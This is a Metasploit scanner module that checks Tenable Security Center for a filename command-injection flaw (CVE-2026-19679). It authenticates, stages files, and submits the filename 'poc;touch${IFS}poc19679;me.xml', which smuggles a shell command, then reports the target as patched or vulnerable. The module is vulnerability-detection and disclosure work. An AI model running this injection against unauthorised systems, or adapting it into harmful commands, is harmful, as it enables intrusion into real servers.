##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  # PARAM_FILENAME rejects only '/' and nonexistent files; the flaw is the missing
  # charset check. 6.9.0's /^[A-Za-z0-9][A-Za-z0-9._-]{0,254}$/ rejects this name.
  METACHAR_NAME = 'poc;touch${IFS}poc19679;me.xml'

  def tailoring_xml
    collection = Rex::Text.rand_text_alphanumeric(8)
    benchmark = Rex::Text.rand_text_alphanumeric(8)
    profile = Rex::Text.rand_text_alphanumeric(8)
    <<~XML
      <?xml version="1.0" encoding="UTF-8"?>
      <ds:data-stream-collection xmlns:ds="http://scap.nist.gov/schema/scap/source/1.2"
                                 xmlns:xccdf="http://checklists.nist.gov/xccdf/1.2"
                                 id="#{collection}">
        <xccdf:Benchmark id="xccdf_#{benchmark}" version="1.0">
          <xccdf:status>draft</xccdf:status>
          <xccdf:title>#{benchmark}</xccdf:title>
          <xccdf:Profile id="xccdf_#{profile}" extends="xccdf_#{benchmark}">
            <xccdf:title>#{profile}</xccdf:title>
          </xccdf:Profile>
        </xccdf:Benchmark>
      </ds:data-stream-collection>
    XML
  end

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Tenable Security Center Audit File Filename Validation Check',
        'Description' => %q{
          Tenable Security Center prior to 6.9.0 insufficiently sanitizes uploaded
          filenames in the SCAP audit file flow. The tailoring filename parameters
          are validated with PARAM_FILENAME, which only rejects '/' and nonexistent
          files — there is no charset constraint, so shell metacharacters pass
          untouched into rename() targets and the downstream SCAP zip repack
          command (the execution sink is CVE-2026-19681).

          This module sends a single POST /rest/auditFile carrying a metacharacter
          filename and classifies the target by its validation behavior:

          <= 6.8.x: request accepted (HTTP 200, audit file created) or the
          post-exec error 106 bounce — no charset validation present
          6.9.0+: immediate "Invalid tailoring filename." rejection

          Tested against SecurityCenter 6.7.2-14 on RHEL9.
        },
        'License' => MSF_LICENSE,
        'Author' => ['h00die'],
        'References' => [
          ['CVE', '2026-19679'],
          ['URL', 'https://www.tenable.com/security']
        ],
        'DisclosureDate' => '2026-08-20',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('USERNAME', [true, 'Username to authenticate with', '']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', ''])
    ])
  end

  def login
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'token'),
      'ctype' => 'application/json',
      'data' => { 'username' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }.to_json
    )
    fail_with(Failure::Unreachable, 'No response to login') unless res
    json = res.get_json_document
    fail_with(Failure::NoAccess, "Login failed: #{json['error_msg']}") if json['error_code'] != 0

    token = json['response']
    token = token['token'] if token.is_a?(Hash)
    fail_with(Failure::NoAccess, "No token in login response: #{json}") if token.blank?

    # the TNS_SESSIONID cookie locates the session; the X-SecurityCenter token is
    # only accepted alongside it (HttpClient keeps no cookie jar of its own).
    # SC rotates the session id on login (two Set-Cookie headers) — keep only the
    # final value; get_cookies also leaks Set-Cookie attributes (SameSite etc.)
    session = res.get_cookies.scan(/TNS_SESSIONID=([a-f0-9]+)/i).flatten.last
    fail_with(Failure::NoAccess, 'No TNS_SESSIONID cookie in login response') unless session
    @cookies = "TNS_SESSIONID=#{session}"
    token.to_s
  end

  def upload(token, context, data, fname)
    form = Rex::MIME::Message.new
    form.add_part(data, 'application/octet-stream', nil, "form-data; name=\"Filedata\"; filename=\"#{fname}\"")
    form.add_part(context, nil, nil, 'form-data; name="context"')
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'file', 'upload'),
      'ctype' => "multipart/form-data; boundary=#{form.boundaries[0]}",
      'data' => form.to_s,
      'headers' => { 'X-SecurityCenter' => token, 'Cookie' => @cookies }
    )
    return nil unless res

    json = res.get_json_document
    return nil if json['error_code'] != 0

    json['response']['filename']
  end

  def run_host(_ip)
    token = login
    # blank context: context=auditFile would run content detection on the dummy
    # zip (error 107); blank contexts skip validation but still stage the file
    staged_zip = upload(token, '', Rex::Text.rand_text_alphanumeric(64), "#{Rex::Text.rand_text_alphanumeric(8)}.zip")
    staged_tail = upload(token, 'tailoringFile', tailoring_xml, "#{Rex::Text.rand_text_alphanumeric(8)}-tailoring.xml")
    fail_with(Failure::UnexpectedReply, 'Staging failed') unless staged_zip && staged_tail

    body = {
      'name' => Rex::Text.rand_text_alphanumeric(8),
      'type' => 'scapLinux',
      'version' => '1.2',
      'benchmarkName' => Rex::Text.rand_text_alphanumeric(8),
      'dataStreamName' => Rex::Text.rand_text_alphanumeric(8),
      'profileName' => '',
      'filename' => staged_zip,
      'originalFilename' => "#{Rex::Text.rand_text_alphanumeric(8)}.zip",
      'tailoringFilename' => staged_tail,
      'tailoringOriginalFilename' => METACHAR_NAME,
      'auditFileTemplate' => { 'id' => -1 },
      'description' => Rex::Text.rand_text_alphanumeric(8)
    }
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'auditFile'),
      'ctype' => 'application/json',
      'data' => body.to_json,
      'headers' => { 'X-SecurityCenter' => token, 'Cookie' => @cookies }
    )
    fail_with(Failure::Unreachable, 'No response to auditFile') unless res

    json = res.get_json_document
    msg = json['error_msg'].to_s
    if msg.include?('Invalid tailoring filename')
      print_good("#{rhost}:#{rport} - Patched (6.9.0+): filename validation rejected the metachar name")
    elsif json['error_code'] == 106
      print_good("#{rhost}:#{rport} - VULNERABLE: metachar filename accepted and reached the SCAP zip repack (post-exec bounce)")
      report_vuln(
        host: rhost,
        port: rport,
        name: @name,
        refs: @references
      )
    elsif json['error_code'] == 0
      print_good("#{rhost}:#{rport} - VULNERABLE: audit file created with the metachar filename (no charset validation)")
      report_vuln(
        host: rhost,
        port: rport,
        name: @name,
        refs: @references
      )
    else
      print_status("#{rhost}:#{rport} - Inconclusive: error_code=#{json['error_code']} #{msg}")
    end
  end
end
